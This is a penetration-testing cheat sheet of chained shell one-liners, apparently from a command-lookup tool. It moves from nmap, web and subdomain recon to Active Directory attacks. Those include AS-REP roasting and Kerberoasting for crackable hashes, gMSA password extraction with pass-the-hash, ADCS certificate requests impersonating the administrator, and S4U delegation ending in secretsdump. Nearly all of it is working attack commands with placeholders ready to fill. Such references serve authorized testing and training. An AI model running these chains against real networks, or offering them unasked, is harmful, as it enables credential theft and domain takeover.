# Chains

> Multi-tool workflows that replace 3-8 separate invocations with one focused command. Each chain filters noise and only surfaces the high-signal output, so you skim results in seconds instead of scrolling through screens of banner text.

<!-- tags: chain, workflow, combined, multi-tool -->

---

## chain full nmap fast-then-deep
Quick top-1k SYN scan first, then deep -sV -sC -O only on the ports actually found. Slashes ~55min off a naive `nmap -A -p-` while keeping the same signal.

```bash
ports=$(sudo nmap -sS -T4 --min-rate=1000 --top-ports 1000 -Pn {{TARGET:ip}} 2>/dev/null | awk '/^[0-9]+\/tcp.*open/{split($1,a,"/"); print a[1]}' | paste -sd,); [ -z "$ports" ] && { echo '[!] no open ports found in top-1k — try -p-'; exit 1; }; echo "[+] top-1k open: $ports"; sudo nmap -sV -sC -O -p "$ports" -Pn -oN {{OUT:file:nmap-full.txt}} {{TARGET:ip}}
```

<!-- meta: risk=low | phase=recon | tags=nmap,chain,fast,deep,full -->

---

## chain quick web recon
whatweb → nikto (60s cap) → nuclei critical/high — all fast tools, whole chain ~90s. Directory brute (ffuf/dirsearch/feroxbuster/gobuster) is deliberately NOT here — those are 5-30min operations, run them separately when you know what to fuzz.

```bash
url=http://{{TARGET:ip}}; ua={{UA:str:$(q-ua)}}; echo '[+] whatweb'; whatweb -a3 --user-agent="$ua" "$url" 2>/dev/null | tr ',' '\n' | sed 's/^\s*//' | head -20; echo; echo '[+] nikto (60s cap)'; timeout 65 nikto -h "$url" -useragent "$ua" -Tuning 123b -maxtime 55s 2>&1 | grep -E '^\+ '; echo; echo '[+] nuclei critical/high'; nuclei -u "$url" -H "User-Agent: $ua" -s critical,high -silent 2>/dev/null; echo; echo '[+] next: q > "ffuf"  or  q > "dirsearch"  when you are ready to fuzz'
```

<!-- meta: risk=low | phase=recon | tags=web,whatweb,nikto,nuclei,chain,quick -->

---

## chain full domain recon passive
subfinder + amass passive, dedup, then httpx alive-check with title + tech. Passive only — no active brute so it's safe to run against real targets.

```bash
domain={{DOMAIN:domain}}; ua={{UA:str:$(q-ua)}}; out={{OUT:file:live-subs.txt}}; tmp=$(mktemp); echo '[+] subfinder'; subfinder -d "$domain" -silent > "$tmp"; echo "  $(wc -l < "$tmp") subs from subfinder"; echo '[+] amass passive (120s cap)'; timeout 120 amass enum -passive -d "$domain" -silent >> "$tmp" 2>/dev/null; sort -u "$tmp" -o "$tmp"; echo "  $(wc -l < "$tmp") total after dedup"; echo; echo '[+] httpx alive + title + tech'; httpx -l "$tmp" -H "User-Agent: $ua" -silent -status-code -title -tech-detect | tee "$out"; rm -f "$tmp"
```

<!-- meta: risk=low | phase=recon | tags=domain,subfinder,amass,httpx,chain,passive -->

---

## chain full smb null session
Everything null-session SMB can tell you: nxc banner, smbmap shares, enum4linux-ng full, smbclient list. Output stripped of blanks and banner noise.

```bash
target={{TARGET:ip}}; echo '[+] nxc smb (null)'; nxc smb "$target" -u '' -p '' 2>&1 | grep -vE '^$|^SMB[[:space:]]+[0-9.]+[[:space:]]+445[[:space:]]+.*Windows' | head -8; echo; echo '[+] smbmap null'; smbmap -H "$target" -u '' -p '' 2>/dev/null | grep -vE '^\[' | head -30; echo; echo '[+] enum4linux-ng (60s cap)'; timeout 60 enum4linux-ng -A "$target" 2>&1 | grep -vE '^\[|Target Information|Enumerating|Session Check|^-+$' | head -80; echo; echo '[+] smbclient list'; smbclient -L "//$target" -N 2>/dev/null | grep -vE '^Anonymous|^\s*$|^\s+Sharename'
```

<!-- meta: risk=low | phase=enum | tags=smb,null,nxc,smbmap,enum4linux,smbclient,chain -->

---

## chain full smb authenticated
Same as null but with creds — plus spider readable shares and rpcclient enumdomusers. Best first step once you have a valid user/pass.

```bash
target={{TARGET:ip}}; user={{USER:str}}; pass={{PASS:str}}; echo '[+] nxc smb auth'; nxc smb "$target" -u "$user" -p "$pass" 2>&1 | grep -v '^$' | head -10; echo; echo '[+] nxc smb computers'; nxc smb "$target" -u "$user" -p "$pass" --computers 2>&1 | grep -vE '^$|Windows Server' | head -20; echo; echo '[+] smbmap shares + perms'; smbmap -H "$target" -u "$user" -p "$pass" 2>/dev/null | grep -vE '^\['; echo; echo '[+] nxc spider-plus (readable shares) — noise-reduced'; nxc smb "$target" -u "$user" -p "$pass" --spider-plus --spider-plus-download false --exclude-shares Users --exclude-dirs Windows --depth 4 2>&1 | grep -v '^$' | head -60; echo; echo '[+] rpcclient enumdomusers'; rpcclient -U "$user%$pass" "$target" -c 'enumdomusers' 2>/dev/null | head -40
```

<!-- meta: risk=low | phase=enum | tags=smb,auth,nxc,smbmap,spider,rpcclient,chain -->

---

## chain full rpc nfs mount-and-list
rpcinfo → showmount → auto-mount the first NFS export read-only and ls its top level. Prints the umount reminder so you don't leave stale mounts.

```bash
target={{TARGET:ip}}; echo '[+] rpcinfo'; rpcinfo -p "$target" 2>/dev/null; echo; echo '[+] showmount exports'; exports=$(showmount -e "$target" 2>/dev/null); echo "$exports"; first=$(echo "$exports" | awk 'NR==2{print $1}'); [ -z "$first" ] && { echo '[!] no exports to mount'; exit 0; }; echo; mnt=$(mktemp -d); echo "[+] mounting $first read-only at $mnt"; sudo mount -t nfs -o ro,nolock,vers=3 "$target:$first" "$mnt" && ls -la "$mnt" && echo && echo "[+] to unmount: sudo umount $mnt && rmdir $mnt"
```

<!-- meta: risk=low | phase=enum | tags=rpc,nfs,rpcinfo,showmount,mount,chain -->

---

## chain ad external recon kerbrute plus asrep
kerbrute userenum → extract valid users → AS-REP roast the ones without pre-auth. No creds required, just a DC IP + domain + a userlist.

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; wordlist={{WORDLIST:file:/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt}}; out={{OUT:file:kerb-users.txt}}; echo '[+] kerbrute userenum'; kerbrute userenum -d "$domain" --dc "$dc" "$wordlist" --safe -o "$out" 2>&1 | grep -E 'VALID|Progress|ERROR' | tail -20; echo; valid=$(mktemp); grep -oE '[a-zA-Z0-9._-]+@' "$out" | sed 's/@$//' | sort -u > "$valid"; count=$(wc -l < "$valid"); echo "[+] $count valid users → $valid"; [ "$count" -eq 0 ] && exit 0; echo; echo '[+] AS-REP roast (no pre-auth)'; impacket-GetNPUsers "$domain/" -usersfile "$valid" -no-pass -dc-ip "$dc" 2>/dev/null | grep -E '^\$krb5asrep' | tee -a asrep-hashes.txt
```

<!-- meta: risk=low | phase=recon | tags=ad,kerbrute,asrep,users,chain -->

---

## chain ad kerberoast get-hashes
GetUserSPNs → extract hashes → save to a file and print the exact hashcat command to run next. Cracking is deliberately separate (hashcat can grind for hours on hard hashes; run it when you're ready).

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; user={{USER:str}}; pass={{PASS:str}}; out={{OUT:file:kerberoast.txt}}; echo '[+] GetUserSPNs'; impacket-GetUserSPNs "$domain/$user:$pass" -dc-ip "$dc" -request 2>&1 | tee "$out" | grep -E '^\$krb5tgs'; hashes=$(grep -c '^\$krb5tgs' "$out"); [ "$hashes" -eq 0 ] && { echo '[!] no SPN hashes'; exit 0; }; grep '^\$krb5tgs' "$out" > /tmp/kerb-hashes; echo; echo "[+] $hashes hash(es) saved to $out (raw) and /tmp/kerb-hashes (hashcat-ready)"; echo; echo '[+] next — crack:'; echo "     hashcat -m 13100 /tmp/kerb-hashes /usr/share/wordlists/rockyou.txt -O"; echo "     (or: q > 'hashcat' for the full hashcat cheatsheet)"
```

<!-- meta: risk=low | phase=attack | tags=ad,kerberoast,spn,chain,get-hashes -->

---

## chain ad bloodhound collect and quick-triage
bloodhound-python collect (All) → prints zip location → quick bloodyAD queries for pre-owned Kerberoastable + AS-REP targets so you have data to act on immediately without opening the GUI.

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; user={{USER:str}}; pass={{PASS:str}}; outdir={{OUT:dir:/tmp/bh}}; mkdir -p "$outdir" && cd "$outdir" || exit 1; echo '[+] bloodhound-python collecting (All)'; bloodhound-python -u "$user" -p "$pass" -d "$domain" -c All -ns "$dc" --zip 2>&1 | grep -vE '^INFO' | tail -6; echo; ls -la "$outdir"/*.zip 2>/dev/null; echo; echo '[+] BloodHound GUI: Ctrl+I → upload the .zip above'; echo; echo '[+] quick bloodyAD triage — kerberoastable users:'; bloodyAD -u "$user" -p "$pass" -d "$domain" --host "$dc" get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName 2>/dev/null | grep -A0 samAccountName | head -20; echo; echo '[+] AS-REP-roastable users:'; bloodyAD -u "$user" -p "$pass" -d "$domain" --host "$dc" get search --filter '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' --attr sAMAccountName 2>/dev/null | grep -A0 samAccountName | head -20
```

<!-- meta: risk=low | phase=enum | tags=ad,bloodhound,bloodyAD,collect,triage,chain -->

---

## chain ad cert attack certipy find
certipy-ad find --vulnerable + -oids (ESC13 detection) + -dc-only (~10× faster, skips per-host CA enum) + -hide-admins (skips admin-owned templates). Prints only ESC-flagged blocks; follow-up req/auth commands printed as hints.

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; user={{USER:str}}; pass={{PASS:str}}; echo '[+] certipy-ad find (fast + ESC13-aware)'; certipy-ad find -u "$user@$domain" -p "$pass" -dc-ip "$dc" -vulnerable -oids -dc-only -hide-admins -stdout 2>&1 | grep -B1 -A5 -E 'ESC[0-9]+|\[!\]|Vulnerable' | head -60; echo; echo '[+] next steps:'; echo "  certipy-ad req -u $user@$domain -p '$pass' -ca <CA_NAME> -template <TEMPLATE> -upn 'administrator@$domain' -dc-ip $dc"; echo "  certipy-ad auth -pfx <output.pfx> -dc-ip $dc"
```

<!-- meta: risk=low | phase=attack | tags=ad,certipy,adcs,esc,esc13,chain -->

---

## chain ad writable objects bloodyAD
bloodyAD get writable — every object your user can modify (paths to abuse, take-over candidates). Kept to the top 60 rows to stay skimmable.

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; user={{USER:str}}; pass={{PASS:str}}; echo '[+] bloodyAD writable objects'; bloodyAD -u "$user" -p "$pass" -d "$domain" --host "$dc" get writable 2>&1 | head -60; echo; echo '[+] bloodyAD DNS dump (30 max)'; bloodyAD -u "$user" -p "$pass" -d "$domain" --host "$dc" get dnsDump 2>&1 | head -30
```

<!-- meta: risk=low | phase=enum | tags=ad,bloodyAD,writable,dns,chain -->

---

## chain ad hosts file from ad
nxc walks a subnet, resolves AD computer names to IPs, and writes them in `/etc/hosts` format — one line to feed straight into sudo tee. Massive time-saver at engagement start when you don't want to keep typing FQDNs.

```bash
target={{TARGET:cidr:10.10.11.0/24}}; user={{USER:str}}; pass={{PASS:str}}; out={{OUT:file:hosts-from-ad.txt}}; echo "[+] nxc --generate-hosts-file on $target"; nxc smb "$target" -u "$user" -p "$pass" --generate-hosts-file "$out" 2>&1 | grep -vE '^$|Windows Server' | tail -15; echo; wc -l "$out" 2>/dev/null; echo; echo '[+] merge into /etc/hosts:'; echo "     sudo tee -a /etc/hosts < $out"
```

<!-- meta: risk=low | phase=recon | tags=ad,hosts-file,nxc,generate,chain -->

---

## chain ad gmsa dump and validate
bloodyAD extracts the msDS-ManagedPassword blob for a gMSA → grabs the derived NT hash → validates it against the DC via nxc pass-the-hash in one shot. If the gMSA has any local access you'll see the auth line immediately.

```bash
dc={{DC_IP:ip}}; domain={{DOMAIN:domain}}; user={{USER:str}}; pass={{PASS:str}}; gmsa={{GMSA_ACCOUNT:str:svc_gmsa$}}; dump=/tmp/gmsa-dump.txt; echo "[+] bloodyAD dump gMSA: $gmsa"; bloodyAD -u "$user" -p "$pass" -d "$domain" --host "$dc" get object "$gmsa" --attr msDS-ManagedPassword 2>&1 | tee "$dump" | head -20; echo; nthash=$(grep -oE '[a-f0-9]{32}' "$dump" | head -1); [ -z "$nthash" ] && { echo '[!] no NT hash derived from blob — check bloodyAD output above'; exit 1; }; echo "[+] derived NT hash: $nthash"; echo; echo "[+] pass-the-hash validate: nxc smb $dc -u '$gmsa' -H $nthash"; nxc smb "$dc" -u "$gmsa" -H "$nthash" 2>&1 | grep -v '^$' | head -5
```

<!-- meta: risk=medium | phase=post | tags=ad,gmsa,bloodyAD,nxc,pth,chain -->

---

## chain web nuclei full automated
Two nuclei passes: (1) `-as` wappalyzer-auto template selection with markdown export, (2) `-dast` parameter fuzzing (medium aggression). Both share a `-me` report dir + `-jle` jsonl for downstream tooling. Progress every 15s so you know it's alive.

```bash
url={{URL:url}}; ua={{UA:str:$(q-ua)}}; report={{REPORT_DIR:dir:nuclei-report}}; out={{OUT:file:nuclei-auto.jsonl}}; echo '[+] pass 1 — auto templates (-as, wappalyzer fingerprint)'; nuclei -u "$url" -H "User-Agent: $ua" -as -stats -si 15 -duc -me "$report" -jle "$out" 2>&1 | tail -10; echo; echo '[+] pass 2 — DAST parameter fuzzing (-dast, -fa medium)'; nuclei -u "$url" -H "User-Agent: $ua" -dast -fa medium -stats -si 15 -duc -jle "${out}.dast" 2>&1 | tail -10; echo; echo "[+] markdown report: $report/"; echo "[+] jsonl: $out (auto scan) + ${out}.dast (fuzzing)"
```

<!-- meta: risk=medium | phase=enum | tags=web,nuclei,as,dast,automated,chain -->

---

## chain ad delegation s4u save ticket
nxc runs S4U2Self+S4U2Proxy for you (`--delegate` + `--delegate-spn`), then saves the resulting service ticket to a ccache with `--generate-st`. Prints the KRB5CCNAME export so you can chain straight into Impacket / smbclient / etc.

```bash
target={{TARGET:ip}}; user={{USER:str}}; pass={{PASS:str}}; victim={{VICTIM:str:administrator}}; spn={{SPN:str:cifs/target.example.local}}; out={{OUT:file:s4u.ccache}}; echo "[+] nxc S4U2Self+S4U2Proxy: $user -> $victim via $spn"; nxc smb "$target" -u "$user" -p "$pass" --delegate "$victim" --delegate-spn "$spn" --generate-st "$out" 2>&1 | grep -v '^$' | head -20; echo; [ -f "$out" ] && { echo "[+] ticket saved: $out"; echo "[+] use it in this shell:"; echo "     export KRB5CCNAME=$out"; echo "     impacket-secretsdump -k -no-pass $victim@target"; } || echo '[!] no ticket generated — check nxc output above'
```

<!-- meta: risk=high | phase=attack | tags=ad,delegation,s4u,kerberos,nxc,chain -->
